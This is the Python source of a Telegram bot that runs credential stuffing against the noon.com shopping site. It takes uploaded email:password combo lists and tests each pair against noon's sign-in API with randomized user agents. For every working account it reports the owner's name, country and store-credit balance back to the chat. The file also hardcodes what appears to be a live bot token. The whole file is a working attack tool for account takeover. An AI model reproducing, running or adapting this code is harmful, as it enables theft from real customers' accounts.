import telebot,time,requests,re,os,random
from telebot import types
from uuid import uuid4
from fake_useragent import UserAgent
#——————————————————————#
session = requests.session()
is_checking = False
#——————————————————————#
bot = telebot.TeleBot("6047075637:AAGq1Np0y4FT8iuVLCpM-F-vLuBkARmK-Fo")
print("BoT Started")
#——————————————————————#
def chk_format(value):
	email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
	pass_regex = r'^[a-zA-Z0-9!@#$%^&*()_+{}\[\]:;<>,.?~\\/`-]+$'
	
	try:email, password = value.split(':')
	except ValueError: return False
	
	if not re.match(email_regex, email):
		return False

	if not re.match(pass_regex, password):
		return False

	return True

def send_tg_message(idd,token,message_text):
	base_url = f'https://api.telegram.org/bot{token}/sendMessage'
	params = {'chat_id': idd,
	'text': message_text}

	requests.get(base_url, params=params)

def file_ex_chk(file_name):
	try:
		with open(file_name, 'r'):
			return True
	except FileNotFoundError:
		return False

def lines_counter(file):
	with open(file, 'r') as file:
		lins = file.readlines()
		return len(lins)

def clean_combo(lins):
	try:
		good_lines = []
		for line in lins:
			line = line.replace('\r','')
			if chk_format(line):
				good_lines.append(line)
		random.shuffle(good_lines)
		return good_lines
	except Exception as e:
		return (f"An error occurred: {e}")

def check_creadit(cookie,country_code):
	url = "https://api-app.noon.com/_svc/customer-v1/credit"
	headers = {
	"accept":"application/json, text/plain, */*", 
	"cache-control":"no-cache",
	"x-platform":"android",
	"x-device-id":"fc5a7078504a2183",
	"x-build":"957",
	"x-content":"mobile",
	"x-mp":"noon",
	"x-locale":f"en-{country_code}",
	"Host":"api-app.noon.com",
	"Connection":"Keep-Alive",
	"User-Agent":"okhttp/3.12.12"
	}
	response = requests.get(url, headers =headers, cookies=cookie)
	return response

def checker(email,passwd):
	headers = {
   'authority': 'www.noon.com',
   'accept': 'application/json, text/plain, */*',
   'accept-language': 'en-US,en;q=0.9',
   'cache-control': 'no-cache, max-age=0, must-revalidate, no-store',
   'content-type': 'application/json',
   'origin': 'https://www.noon.com',
   'referer': 'https://www.noon.com/egypt-ar/account_mobile/',
   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
   'sec-ch-ua-mobile': '?1',
   'sec-ch-ua-platform': '"Android"',
   'sec-fetch-dest': 'empty',
   'sec-fetch-mode': 'cors',
   'sec-fetch-site': 'same-origin',
   'user-agent': UserAgent().random,
   'x-cms': 'v2',
   'x-content': 'mobile',
   'x-locale': 'en-us',
   'x-mp': 'noon',
   'x-platform': 'web',
   'x-visitor-id': str(uuid4())
	}
	
	json_data = {
		'email': email,
		'password': passwd
	}
	
	response = requests.post('https://www.noon.com/_svc/customer-v1/auth/signin',  headers=headers, json=json_data,timeout=20)
	os.system('cls' if os.name=='nt' else 'clear')
	return response
#——————————————————————#
@bot.message_handler(commands=['start'])
def start(message):
	global is_checking
	is_checking = True
	chat_id = message.chat.id
	bot.send_message(message.chat.id, "Welcome! Send me the file.")
#——————————————————————#
	@bot.message_handler(content_types=['document'])
	def handle_document(message):
		global is_checking
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		file_content = downloaded_file.decode('utf-8')

		lines = file_content.strip().split('\n')
		lines = clean_combo(lines)
		if not is_checking:return
#——————————————————————#
		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait ⌛")
#——————————————————————#
		good = 0
		bad = 0
		done = -1
#——————————————————————#
		for line in lines:
			if not is_checking:return
			line = line.strip()
			try:
				email, passwd = line.split(':')
				email1 = f"{email} • {passwd}"	#——————————————————————#
				try:res = (checker(email,passwd))
				except (requests.exceptions.ReadTimeout,requests.exceptions.ConnectTimeout):time.sleep(20)
#—————————Request———————––#
				if res.status_code == 200:
					good += 1
					country_code = res.text.split('"countryCode":"')[1].split('"')[0]
					name = res.json().split('"firstName":"')[1].split('"')[0]
#——————————————————————#
					res2 = check_creadit(res.cookies,country_code)
					balance = res2.json()['data']['balance']
					currency = res2.json()['data']['currencyCode']
					to_save = f"""{email}:{passwd} | {name} | {country_code} | {balance}{currency}
"""
#——————————————————————#
					bot.send_message(chat_id,text=to_save)	#——————————————————————#
				else:bad += 1
				done += 1
#——————————————————————#
				reply_markup = create_reply_markup(email1,good,bad,len(lines))
				try:
					bot.edit_message_reply_markup(
	chat_id=chat_id,
	message_id=msg.message_id,
	reply_markup=reply_markup)
				except telebot.apihelper.ApiTelegramException:
					print(line)
#——————————————————————#
			except ValueError:print("fuck")
		is_checking = False
		bot.send_message(chat_id,"The check has completed successfully")
		return
	return
#——————————————————————#
def create_reply_markup(line, work, fucked, All):
    markup = types.InlineKeyboardMarkup()
    email_button = types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
    work_button = types.InlineKeyboardButton(text=f"⌯ Working: {work} ⌯", callback_data='none')
    dead_button = types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
    all_button = types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
    team_button = types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
    dev_button = types.InlineKeyboardButton(text="Dev", url='https://t.me/E_2_7')
    
    stop_button = telebot.types.InlineKeyboardButton(text="STOP", callback_data="stop")
    
    markup.add(email_button)
    markup.add(work_button)
    markup.add(dead_button,all_button)
    markup.add(team_button,dev_button)
    markup.add(stop_button)
    return markup
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
		global is_checking
		if call.data == "stop":
			is_checking = False
			bot.answer_callback_query(call.id, text="Checking stopped.")
#——————————————————————#
bot.infinity_polling()
